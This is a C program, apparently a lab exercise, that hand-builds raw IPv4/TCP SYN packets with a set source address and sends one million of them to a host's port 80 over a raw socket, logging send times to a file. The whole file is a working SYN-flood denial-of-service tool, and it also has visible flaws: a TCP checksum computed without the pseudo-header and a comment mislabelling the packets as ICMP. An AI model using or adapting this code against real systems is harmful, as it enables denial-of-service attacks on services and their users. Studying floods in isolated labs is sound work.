#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include <time.h>

//#define SRC_IP "192.168.14.3"
//#define DEST_IP "192.168.14.4"
#define PACKET_LEN 1024
 // IPv4 header len without options
#define IP4_HDRLEN 20

/* TCP header */
typedef unsigned int tcp_seq;






struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};


unsigned short in_cksum(unsigned short *buf, int length);
void sendIpPacket(struct ipheader* ip);

void buildTcpPacket(struct tcphdr* tcp, u_int16_t DEST_PORT)
{
    /* building tcp packets */
    tcp->th_sport = htons(1);
    tcp->th_dport = htons(DEST_PORT);
    tcp->th_ack = 0;
    tcp->th_seq = htonl(rand());
    tcp->th_off = 5;
    tcp->th_flags = TH_SYN;
    tcp->th_urp = 0;
    tcp->th_sum = in_cksum((unsigned short *)tcp, sizeof(struct tcphdr));
}


void buildIpPacket(struct ipheader* ip, char* SRC_IP, char* DEST_IP)
{
    ip->iph_ver = 4;
    ip->iph_ihl = 5;
    ip->iph_tos=16;
    ip->iph_ttl=64;
    ip->iph_sourceip.s_addr = inet_addr(SRC_IP);
    ip->iph_destip.s_addr = inet_addr(DEST_IP);

    ip->iph_protocol = IPPROTO_TCP;
    ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcphdr));
    
}

int equels (char* c1, char* c2)
{
    for (size_t i = 0; *(c1 + i) != '\0' && *(c2 + i) != '\0'; i++)
    {
        if (*(c1 + i) != *(c2 + i))
        {
            return 0;
        }
    }
    return 1;
}

int writeToFile_double(char* path, double content)
{
    int num;
    FILE *fptr;
    // use appropriate location if you are using MacOS or Linux
    fptr = fopen(path, "a+");

    if(fptr == NULL)
    {
        printf("Error!");   
        exit(1);             
    }

    fprintf(fptr,"%f",content);
    fprintf(fptr, "\n");
    fclose(fptr);

    return 0;
}

int writeToFile_string(char* path, char* content)
{
    int num;
    FILE *fptr;
    // use appropriate location if you are using MacOS or Linux
    fptr = fopen(path, "a+");

    if(fptr == NULL)
    {
        printf("Error!");   
        exit(1);             
    }
    if (content == NULL)
    {
        printf("sdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdf");
        fprintf(fptr, " ");
    }
    else
    {
        fprintf(fptr,"%s",content);
    }
    fclose(fptr);

    return 0;
}

int writeToFile_char(char* path, char content)
{
    int num;
    FILE *fptr;
    // use appropriate location if you are using MacOS or Linux
    fptr = fopen(path, "a+");

    if(fptr == NULL)
    {
        printf("Error!");   
        exit(1);             
    }

    fprintf(fptr,"%c",content);
    fclose(fptr);

    return 0;
}

int writeToFile_int(char* path, int content, int newLine)
{
    int num;
    FILE *fptr;
    // use appropriate location if you are using MacOS or Linux
    fptr = fopen(path, "a+");

    if(fptr == NULL)
    {
        printf("Error!");   
        exit(1);             
    }

    fprintf(fptr,"%d",content);
    if(newLine == 1)
    {
        fprintf(fptr, "\n");
    }
    if (newLine == 2)
    {
        fprintf(fptr, " ");
    }
    
    fclose(fptr);

    return 0;
}

int main(int argc, char *argv[])
{
    char* SRC_IP = "192.168.14.116";
    char* DEST_IP = "192.168.14.4";
    u_int16_t DEST_PORT = 80;
    /*if (argc != 0)
    {
        printf("%d ---->   %s\n", argc, *argv);
        for (size_t i = 0; i < argc; i++)
        {
            printf("------     %s\n",argv[i]);
            if (equels(argv[i], "-t"))
            {
                DEST_IP = argv[i+1];
                printf("here");
                printf("%s\n", DEST_IP);
            }
            else if(equels(argv[i], "-p"))
            {
                DEST_PORT = atoi(argv[i+1]);
            }
            else if(equels(argv[i], "-r"))
            {
                udpAttack = 1;
            }
        }
    }*/
    
    char buffer[PACKET_LEN];
    memset(buffer, 0, PACKET_LEN);
    struct tcphdr* tcp = (struct tcphdr*)(buffer + sizeof(struct ipheader));
    
    buildTcpPacket(tcp, DEST_PORT);
    
    struct ipheader *ip = (struct ipheader *) buffer;
    buildIpPacket(ip, SRC_IP, DEST_IP);
    double time_spent = 0;
    for(int i = 0; i < 100; i++)
    {
        for(int j = 0; j < 10000; j++)
        {
            int index = i * 10000 + j;
            writeToFile_int("./syns_results_c.txt", index, 2);
            printf("packet number %d\n", index);
            clock_t begin_send = clock();
            sendIpPacket(ip);
            clock_t end_send = clock();
            double time_spent_sending = (double)(end_send - begin_send) / CLOCKS_PER_SEC;
            writeToFile_double("./syns_results_c.txt", time_spent_sending);
            printf("time spent sending: %f\n", time_spent_sending);
            time_spent += time_spent_sending;
        }
        //break;
    }
    writeToFile_string("./syns_results_c.txt", "Total time: ");
    writeToFile_double("./syns_results_c.txt", time_spent);
    printf("time spent: %f\n", time_spent);
    double avg = time_spent / 1000000;
    writeToFile_string("./syns_results_c.txt", "Average: ");
    writeToFile_double("./syns_results_c.txt", avg);
    printf("avg for 1 packet: %f", avg);
    
    return 0;

}

// This function sends out spoofed ICMP packets.
void sendIpPacket(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
    {
        perror("socket error!\n");
        return;
    }
    
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0)
    {
        perror("setsockopt failed!\n");
        return;
    }

    dest_info.sin_family = AF_INET;
    dest_info.sin_addr=ip->iph_destip;

    printf("Sending spoofed IP packet...\n");
    size_t n = sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    if (n < 0)
    {
        perror("PACKET NOT SENT\n");
        return;
    }
    else
    {
        printf("\n......................................\n");
        printf(" From: %s\n", inet_ntoa(ip->iph_sourceip));
        printf(" To: %s\n", inet_ntoa(ip->iph_destip));
        printf("\n......................................\n");
    }
    close(sock);
}

unsigned short in_cksum(unsigned short *buf, int length)
{
        unsigned short *w = buf;
        int nleft = length;
        int sum = 0;
        unsigned short temp = 0;
        while (nleft>1)
        {
            sum+= *w++;
            nleft -=2;

        }

        if(nleft==1)
        {
            *(unsigned char *)(&temp) = *(unsigned char *)w;
            sum+=temp;
        }
        
        sum = (sum>>16) + (sum & 0xffff);
        sum +=(sum>>16);
        return (unsigned short)(~sum);
        
}
